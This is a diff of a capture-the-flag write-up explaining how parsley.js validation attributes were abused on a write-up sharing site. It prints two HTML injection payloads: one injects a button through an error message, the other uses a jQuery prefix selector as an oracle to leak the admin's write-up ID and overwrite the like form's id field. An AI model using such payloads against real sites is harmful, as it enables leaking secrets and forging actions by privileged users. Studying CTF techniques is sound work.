@@ -5,7 +5,7 @@ The website offers this functionlaity:
 * A submitted write-up gets a unique ID (16 hex characters)
 * You can see a list of all YOUR write-ups and view each one of them. You can view a write-up which is not yours only if you have its ID
 * You can like a write-up (yours or not, if you have the ID)
-* You can "show your write-up to the admin" - the admin has an ID of "admin" and when you show him a write-up, he "likes" it
+* You can "show your write-up to the admin" - the admin has an ID of "admin" and when you show him a write-up, he "likes" it  
 
 More internal info:  
 The write-ups are "validated" on client side by a JS package called [parsley](https://parsleyjs.org/). The validation makes sure there are no `<>` characters in the write-up.  
@@ -19,26 +19,24 @@ The [parsley](https://parsleyjs.org/) package is used to validate input elements
 * Inject a form with a validated input, containing bad input
 * Invoke validation on page load (tried various methods coupled with `autofocus`)
 * Make the validation inject a `like` button to the bieginning of the DOM - we used the `<h3>` element as our container, as it's the only `h3` element in the page and it comes before the like button  
+
 This is what we tried to inject:
 ```
 <form data-parsley-validate>
-  <input type="text" 
-         class="form-control" 
-         id="blah" name="blah"
-         
-         data-parsley-trigger="load"
-         data-parsley-required
-         required
-         
-         data-parsley-errors-container="h3"
-         data-parsley-error-message='<input type="button" id="like" value="CLICKME">'
-         
-         data-parsley-validate-if-empty
-         data-parsley-validation-threshold="0"
-         data-parsley-minlength="0"
-         value=''
-         autofocus>
-  <input type="submit">
+	<input type="text" 
+		data-parsley-trigger="load"
+        data-parsley-required
+        required
+
+        data-parsley-errors-container="h3"
+        data-parsley-error-message='<input type="button" id="like" value="CLICKME">'
+
+        data-parsley-validate-if-empty
+        data-parsley-validation-threshold="0"
+        data-parsley-minlength="0"
+        value=''
+        autofocus>
+	<input type="submit">
 </form>
 ```
 However, `load init blur focusin focusout` and all other valid triggers failed to validate on page load. *Later we found that other teams have been sucessful with `blur`, however, for some reason, we could not.*  
@@ -47,7 +45,7 @@ If we could make the validation fail on a successful guess of the admin's write-
 * The `input` element contains an attribute of `data-parsley-equalto="JQUERY_SELECTOR"`
 * On validation, parsley finds the element by invoking `$(JQUERY_SELECTOR)`
 * If the element is **found**, parsley checks that the data in the `input` is equal to `element.val()`
-* If the element is **not found**, parsley checks that the data in the `input` is equal to the **value of the `data-parsley-equalto` attribute - JQUERY_SELECTOR**
+* If the element is **not found**, parsley checks that the data in the `input` is equal to the **value of the `data-parsley-equalto` attribute - JQUERY_SELECTOR**  
 
 jQuery supports selecting elements by any attribute, and more importantly by partial match to an attribute, say, to the beginning of the value of an attribute. The write-up link in the admin's page is `<a href="/show.php?id=ID">` and we can select it by using this selector: `a[href^="/show.php?id=6"]`. If the ID starts with `6` then it will be selected, otherwise, no elements will be selected.  
 So recap:
@@ -57,19 +55,20 @@ So recap:
 * If parsley doesn't find it, it matches the contents of the validated `input` to the selector string - validation **passes**. The admin likes the write-up
 * If parsley finds it, it matces the contents of the validated `input` to `element.val()` - which **fails**, since the `a` element produces an empty string on `val()`.
 * Since the validation fails, we inject an input to the like `<form>` which overwrites the `id input` in the `form` - The admin likes a write-up of our choosing  
+
 The injected text:
 ```
 <form data-parsley-validate>
-  <input type="text" 
-         data-parsley-trigger="focusout"
-         data-parsley-equalto='a[href^="/show.php?id=GUESS"]'
-         
-         data-parsley-errors-container="form[action='/like.php']"
-         data-parsley-error-message='<input type="input" name="id" value="0000000000000000">'
-         
-         value='a[href^="/show.php?id=GUESS"]'
-         autofocus>
-  <input type="submit">
+	<input type="text" 
+        data-parsley-trigger="focusout"
+        data-parsley-equalto='a[href^="/show.php?id=GUESS"]'
+
+        data-parsley-errors-container="form[action='/like.php']"
+        data-parsley-error-message='<input type="input" name="id" value="0000000000000000">'
+
+        value='a[href^="/show.php?id=GUESS"]'
+        autofocus>
+	<input type="submit">
 </form>
 ```
 We don't actually need the admin to like an actual post, we just need him **not to like ours** so we can use `value="0000000000000000"`.  
